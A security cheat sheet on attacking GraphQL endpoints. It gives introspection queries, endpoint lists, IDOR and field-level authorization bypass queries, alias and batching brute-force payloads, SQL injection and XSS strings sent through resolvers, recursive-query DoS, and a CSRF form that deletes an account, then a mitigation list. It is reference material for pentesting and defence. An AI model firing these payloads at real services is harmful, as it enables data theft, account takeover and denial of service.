# GraphQL Injection

> GraphQL endpoints expose flexible querying. Misconfigurations and missing authorization checks at the field level lead to data exposure, DoS, and authentication bypass.

## Summary

- [Identifying GraphQL](#identifying-graphql)
- [Introspection](#introspection)
- [Fingerprinting](#fingerprinting)
- [Common Endpoints](#common-endpoints)
- [Authorization Bypass](#authorization-bypass)
- [SQL Injection / Other Injection via Resolvers](#sql-injection--other-injection-via-resolvers)
- [DoS via Deep / Recursive Queries](#dos-via-deep--recursive-queries)
- [Batching Attacks](#batching-attacks)
- [Mutation Abuse](#mutation-abuse)
- [CSRF on GraphQL](#csrf-on-graphql)
- [Mitigation](#mitigation)
- [References](#references)

## Identifying GraphQL

Response indicators:

- `{"data": ...}`, `{"errors": [...]}` shape
- Header `Content-Type: application/json` with `query` field
- `GET /graphql?query={__typename}` returns `{"data":{"__typename":"Query"}}`

## Introspection

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name kind } }
      }
    }
  }
}
```

Compact form:

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
```

### When introspection is disabled

- Try `__schema` partially — sometimes only `__schema` is blocked, not `__type`:
  ```graphql
  { __type(name:"User") { name fields { name } } }
  ```
- Use field-suggestion errors: send a mistyped field, the error message often suggests valid names.
  ```graphql
  { user { idd } }     # error: did you mean "id"?
  ```
- [Clairvoyance](https://github.com/nikitastupin/clairvoyance) reconstructs schemas using suggestions.
- Wordlists of common fields: `id`, `email`, `password`, `role`, `isAdmin`.

## Fingerprinting

- [graphw00f](https://github.com/dolevf/graphw00f) — fingerprints the GraphQL engine.

## Common Endpoints

```
/graphql
/graphiql
/playground
/altair
/v1/graphql
/api/graphql
/graphql.php
/graphql/console
/explorer
/voyager
```

## Authorization Bypass

### Missing field-level auth

```graphql
{ users { id email role passwordHash } }
{ allOrders { id userId total } }
```

Often the list resolver is gated, but item-level fields aren't.

### IDOR via parameters

```graphql
{ user(id: 1) { email passwordResetToken } }
{ order(id: 12345) { items shippingAddress } }
```

### Aliasing for brute force

GraphQL aliases let you send many queries in one request — bypasses naive rate-limiting:

```graphql
query {
  a: login(user:"admin", pass:"123456")
  b: login(user:"admin", pass:"password")
  c: login(user:"admin", pass:"qwerty")
  ...
}
```

## SQL Injection / Other Injection via Resolvers

If a resolver passes arguments to a backend without sanitization:

```graphql
{ user(name:"' OR 1=1-- -") { id email } }
{ search(q:"<svg onload=alert(1)>") { results } }
```

## DoS via Deep / Recursive Queries

```graphql
{
  user(id:1) {
    posts {
      author {
        posts {
          author {
            posts {
              author { posts { author { posts { id } } } }
            }
          }
        }
      }
    }
  }
}
```

Without depth-limiting, this can pin CPU and exhaust DB.

### Fragment cycles (some engines)

```graphql
fragment A on User { ...B }
fragment B on User { ...A }
{ user { ...A } }
```

## Batching Attacks

Many GraphQL servers accept arrays of operations:

```json
[
  {"query":"mutation { login(user:\"a\", pass:\"1\") { token } }"},
  {"query":"mutation { login(user:\"a\", pass:\"2\") { token } }"},
  ...
]
```

Bypasses per-request rate limits.

## Mutation Abuse

Look for mutations like:

```graphql
updateUser(id: Int!, role: String): User
deleteUser(id: Int!): Boolean
createInvitation(email: String!): Invitation
internalDebugQuery(sql: String!): String       # yes, this happens
```

Without authorization checks, these grant total control.

## CSRF on GraphQL

If GraphQL accepts `application/x-www-form-urlencoded` or simple GETs, classic CSRF applies:

```html
<form action="https://target.tld/graphql" method="POST">
  <input name="query" value='mutation { deleteAccount }'>
</form>
```

GET-based GraphQL (`/graphql?query=...`) makes CSRF trivial.

## Mitigation

- Disable introspection in production.
- Enforce authorization in **resolvers**, per field, not only at the top level.
- Add **query depth/complexity limits**.
- Disable **field suggestions** error messages in production.
- Reject GETs and require `Content-Type: application/json` to mitigate CSRF.
- Apply **rate-limiting per operation count**, not per request, to defeat aliasing/batching.

## References

- [OWASP — GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [PortSwigger — GraphQL](https://portswigger.net/web-security/graphql)
- [HackTricks — GraphQL](https://book.hacktricks.xyz/pentesting-web/graphql)
